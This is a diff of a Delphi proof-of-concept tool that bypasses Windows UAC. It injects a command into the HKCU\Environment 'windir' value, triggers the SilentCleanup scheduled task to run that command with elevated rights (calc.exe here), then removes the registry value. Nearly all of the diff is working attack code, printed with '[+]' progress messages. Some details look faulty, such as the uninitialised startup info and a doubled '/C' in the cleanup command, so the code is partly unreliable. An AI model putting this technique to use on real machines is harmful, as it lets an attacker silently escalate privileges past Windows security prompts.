@@ -17,6 +17,10 @@ timeout /t 2 >nul
 
 }
 
+
+//https://stackoverflow.com/questions/18013251/delphi-createprocess-execute-multiple-commands
+
+
 uses
   SysUtils,
   windows,
@@ -35,50 +39,62 @@ begin
   end;
 end;
 
-{
-path := 'D:\Qport\trunk\Qport\';
-  cmd := 'C:\Windows\System32\cmd.exe';
-  //debug
-  input := '/C' + SVN_PATH + ' help > C:\users\PhilippKober\UNIQUE_NAME_BLUB.txt';
 
-  CreateOk := CreateProcess(PChar(cmd), PChar(input), nil, nil, false, CREATE_NEW_PROCESS_GROUP + NORMAL_PRIORITY_CLASS, nil,
-     Pchar(path), StartInfo, ProcInfo);
-  if CreateOk then
-    // may or may not be needed. Usually wait for child processes
-    WaitForSingleObject(ProcInfo.hProcess, INFINITE);
-}
+function se(input: string): Boolean;
+var
+  StartInfo: TStartupInfo;
+  ProcInfo: TProcessInformation;
+  CreateOk : Boolean;
 
 
-function se(cmd,params: string): Boolean;
 begin
+   CreateOk := CreateProcess(
+    nil,
+    PChar(input),
+    nil,
+    nil,
+    False,
+    CREATE_NEW_PROCESS_GROUP or NORMAL_PRIORITY_CLASS,
+    nil,
+    'D:\Qport\trunk\Qport',
+    StartInfo,
+    ProcInfo
+  );
 
+  if CreateOk then
+    WriteLn('[+] Success, wait for your command to proc');
 end;
 
 
 begin
 var
-  cmd, param : string;
+  cmd, param, path, com : string;
+
+  cmd := 'cmd.exe';
+  path := 'C:\Windows\Tasks';
 
 
 
   try
-  //set registry & sleep 5
+  WriteLn('[+] set registry & sleep 5');
+    sleep(5000);
     sr('HKCU\Environment','windir','cmd /c start calc.exe&REM ');
-    sleep(5000);
 
-  //run sched to proc
-    cmd := 'cmd.exe';
-    param := '/C schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul';
-    se(cmd,param);
 
-  //
+  WriteLn('[+] run sched to proc');
     sleep(5000);
-    //
-    cmd := 'cmd.exe';
+    param := 'schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul';
+    com := cmd + ' /C ' + param;
+    se(com);
+
+
+  WriteLn('[+] cleanup');
+    sleep(5000);
     param := '/C reg delete "HKCU\Environment" /v "windir" /F >nul';
-    se(cmd,param);
+    com := cmd + ' /C ' + param;
+    se(com);
 
-    sleep(5000);
+
   except
     on E: Exception do
       Writeln(E.ClassName, ': ', E.Message);
